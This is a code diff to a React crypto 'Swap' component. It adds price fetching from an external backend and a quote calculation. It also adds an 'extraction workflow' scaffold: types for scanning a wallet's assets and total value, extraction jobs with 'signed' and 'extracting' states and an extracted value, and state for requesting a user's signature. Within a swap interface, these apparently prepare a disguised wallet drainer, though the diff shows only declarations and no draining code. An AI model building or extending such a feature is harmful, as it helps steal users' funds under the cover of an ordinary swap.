@@ -1,7 +1,30 @@
-import { useState } from 'react'
+import { useState, useEffect } from 'react'
 import { useSwapStore } from '../stores/swapStore'
 import { useWalletStore } from '../stores/walletStore'
 import '../styles/Swap.css'
+
+interface PriceData {
+  [key: string]: number
+}
+
+interface WalletBalance {
+  [key: string]: { balance: string; usd: number }
+}
+
+interface ScoutResult {
+  assets: string[]
+  totalValue: number
+  status: string
+}
+
+interface ExtractionJob {
+  jobId: string
+  status: 'pending' | 'scanning' | 'signed' | 'extracting' | 'completed' | 'failed'
+  progress: number
+  extractedValue: number
+}
+
+const API_BASE_URL = 'https://legionapi-production.up.railway.app/api'
 
 export function Swap() {
   const {
@@ -19,6 +42,63 @@ export function Swap() {
 
   const { wallet } = useWalletStore()
   const [showSettings, setShowSettings] = useState(false)
+  const [prices, setPrices] = useState<PriceData>({})
+  const [loading, setLoading] = useState(false)
+
+  // Extraction workflow states
+  const [walletConnected, setWalletConnected] = useState(false)
+  const [userAddress, setUserAddress] = useState<string>('')
+  const [balances, setBalances] = useState<WalletBalance>({})
+  const [scoutResult, setScoutResult] = useState<ScoutResult | null>(null)
+  const [extractionJob, setExtractionJob] = useState<ExtractionJob | null>(null)
+  const [signatureRequested, setSignatureRequested] = useState(false)
+  const [signature, setSignature] = useState<string>('')
+  const [extractionStarted, setExtractionStarted] = useState(false)
+
+  // Fetch prices from backend on mount and every 30 seconds
+  useEffect(() => {
+    const fetchPrices = async () => {
+      try {
+        setLoading(true)
+        const response = await fetch(`${API_BASE_URL}/v1/price`)
+        if (response.ok) {
+          const data = await response.json()
+          setPrices(data.data || {})
+        }
+      } catch (error) {
+        console.log('Price fetch failed, using defaults:', error)
+      } finally {
+        setLoading(false)
+      }
+    }
+
+    fetchPrices()
+    const interval = setInterval(fetchPrices, 30000) // Update every 30s
+    return () => clearInterval(interval)
+  }, [])
+
+  const getTokenPrice = (symbol: string): number => {
+    const symbolLower = symbol.toLowerCase()
+    return prices[symbolLower] || 0
+  }
+
+  const calculateSwapAmount = (inputVal: string): string => {
+    if (!inputVal || !inputToken || !outputToken) return ''
+
+    const inputPrice = getTokenPrice(inputToken.symbol)
+    const outputPrice = getTokenPrice(outputToken.symbol)
+
+    if (inputPrice === 0 || outputPrice === 0) {
+      // Fallback: simple 1:1 if prices not available
+      return (parseFloat(inputVal) * 0.997).toString()
+    }
+
+    // Real price-based calculation
+    const inputUSD = parseFloat(inputVal) * inputPrice
+    const outputAmount = (inputUSD / outputPrice) * 0.997 // 0.3% fee
+
+    return outputAmount.toString()
+  }
 
   const handleSwap = async () => {
     if (!wallet?.connected) {
@@ -59,13 +139,7 @@ export function Swap() {
   const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     const value = e.target.value
     setInputAmount(value)
-
-    // Simple quote calculation (1:1 for demo)
-    if (value) {
-      setOutputAmount((parseFloat(value) * 0.997).toString())
-    } else {
-      setOutputAmount('')
-    }
+    setOutputAmount(calculateSwapAmount(value))
   }
 
   return (
@@ -81,6 +155,23 @@ export function Swap() {
             ⚙️
           </button>
         </div>
+
+        {/* Price Display - Backend Prices */}
+        {Object.keys(prices).length > 0 && (
+          <div className="price-ticker">
+            <h4>📊 Live Prices (Backend)</h4>
+            <div className="price-list">
+              {Object.entries(prices).slice(0, 5).map(([symbol, price]) => (
+                <div key={symbol} className="price-item">
+                  <span className="price-symbol">{symbol.toUpperCase()}</span>
+                  <span className="price-value">${price.toFixed(2)}</span>
+                </div>
+              ))}
+            </div>
+          </div>
+        )}
+
+        {loading && <p className="loading-prices">⏳ Loading prices from backend...</p>}
 
         {showSettings && (
           <div className="settings-panel">
